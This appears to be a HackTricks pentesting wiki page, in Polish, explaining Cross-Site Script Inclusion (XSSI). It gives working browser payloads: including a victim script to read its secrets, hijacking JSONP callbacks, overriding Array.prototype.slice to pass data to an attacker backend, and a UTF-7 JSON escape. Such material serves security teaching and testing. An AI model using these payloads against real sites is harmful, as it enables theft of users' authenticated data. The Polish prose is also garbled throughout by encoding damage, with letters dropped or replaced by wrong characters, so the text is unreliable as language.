# XSSI (Cross-Site Script Inclusion)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Basic Information

**Cross-Site Script Inclusion (XSSI)** to luka, kt贸ra wynika z natury tagu `script` w HTML. W przeciwiestwie do wikszoci zasob贸w, kt贸re podlegaj **Same-Origin Policy (SOP)**, skrypty mog by doczane z r贸偶nych domen. To zachowanie ma na celu uatwienie korzystania z bibliotek i innych zasob贸w hostowanych na r贸偶nych serwerach, ale wprowadza r贸wnie偶 potencjalne ryzyko bezpieczestwa.

### Key Characteristics of **XSSI**:
- **Bypass of SOP**: Skrypty s zwolnione z **Same-Origin Policy**, co pozwala na ich doczanie midzy domenami.
- **Data Exposure**: Atakujcy mo偶e wykorzysta to zachowanie do odczytu danych zaadowanych za pomoc tagu `script`.
- **Impact on Dynamic JavaScript/JSONP**: **XSSI** jest szczeg贸lnie istotne dla dynamicznego JavaScriptu lub **JSON with Padding (JSONP)**. Technologie te czsto wykorzystuj informacje "ambient-authority" (takie jak ciasteczka) do uwierzytelniania. Gdy 偶danie skryptu jest wysyane do innego hosta, te dane uwierzytelniajce (np. ciasteczka) s automatycznie doczane do 偶dania.
- **Authentication Token Leakage**: Jeli atakujcy mo偶e oszuka przegldark u偶ytkownika, aby za偶daa skryptu z serwera, kt贸ry kontroluje, mo偶e uzyska dostp do wra偶liwych informacji zawartych w tych 偶daniach.

### Types

1. **Static JavaScript** - To reprezentuje konwencjonaln form XSSI.
2. **Static JavaScript with Authentication** - Ten typ jest odmienny, poniewa偶 wymaga uwierzytelnienia do uzyskania dostpu.
3. **Dynamic JavaScript** - Dotyczy JavaScriptu, kt贸ry dynamicznie generuje tre.
4. **Non-JavaScript** - Odnosi si do luk, kt贸re nie dotycz bezporednio JavaScriptu.

**The following information is a sumary of [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Check it for further details.


### Regular XSSI
W tym podejciu prywatne informacje s osadzone w og贸lnodostpnym pliku JavaScript. Atakujcy mog identyfikowa te pliki za pomoc metod takich jak odczyt plik贸w, wyszukiwanie s贸w kluczowych lub wyra偶e regularnych. Po zlokalizowaniu skryptu zawierajcego prywatne informacje mo偶na go doczy do zoliwej treci, co umo偶liwia nieautoryzowany dostp do wra偶liwych danych. Przykad techniki wykorzystania pokazano poni偶ej:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### Dynamic-JavaScript-based-XSSI i Authenticated-JavaScript-XSSI
Te typy atak贸w XSSI polegaj na dynamicznym dodawaniu poufnych informacji do skryptu w odpowiedzi na 偶danie u偶ytkownika. Wykrywanie mo偶na przeprowadzi, wysyajc 偶dania z i bez ciasteczek oraz por贸wnujc odpowiedzi. Jeli informacje si r贸偶ni, mo偶e to wskazywa na obecno poufnych danych. Proces ten mo偶na zautomatyzowa za pomoc narzdzi takich jak [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS) rozszerzenie Burp.

Jeli poufne dane s przechowywane w zmiennej globalnej, mo偶na je wykorzysta za pomoc podobnych metod jak w Regular XSSI. Jednak jeli poufne dane s zawarte w odpowiedzi JSONP, atakujcy mog przej funkcj zwrotn, aby uzyska te informacje. Mo偶na to zrobi, manipulujc obiektami globalnymi lub ustawiajc funkcj do wykonania przez odpowied藕 JSONP, jak pokazano poni偶ej:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Dla zmiennych, kt贸re nie znajduj si w globalnej przestrzeni nazw, *prototype tampering* mo偶e czasami by wykorzystane. Technika ta wykorzystuje projekt JavaScriptu, w kt贸rym interpretacja kodu polega na przeszukiwaniu acucha prototyp贸w w celu zlokalizowania wywoywanej waciwoci. Poprzez nadpisanie niekt贸rych funkcji, takich jak `Array`'s `slice`, atakujcy mog uzyska dostp do zmiennych nieglobalnych i je ujawnia:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
Dalsze szczeg贸y dotyczce wektor贸w ataku mo偶na znale藕 w pracy badacza bezpieczestwa [Sebastiana Lekiesa](https://twitter.com/slekies), kt贸ry prowadzi list [wektor贸w](http://sebastian-lekies.de/leak/).

### Non-Script-XSSI
Badania Takeshiego Terady wprowadzaj inn form XSSI, w kt贸rej pliki Non-Script, takie jak CSV, s wyciekane midzy 藕r贸dami poprzez wczenie ich jako 藕r贸da w tagu `script`. Historyczne przypadki XSSI, takie jak atak Jeremiah Grossmana z 2006 roku na odczytanie penej ksi偶ki adresowej Google oraz wyciek danych JSON Joe Walkera z 2007 roku, podkrelaj powag tych zagro偶e. Dodatkowo, Gareth Heyes opisuje wariant ataku z wykorzystaniem kodowania UTF-7 w JSON, aby uciec od formatu JSON i wykona skrypty, skuteczny w niekt贸rych przegldarkach:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
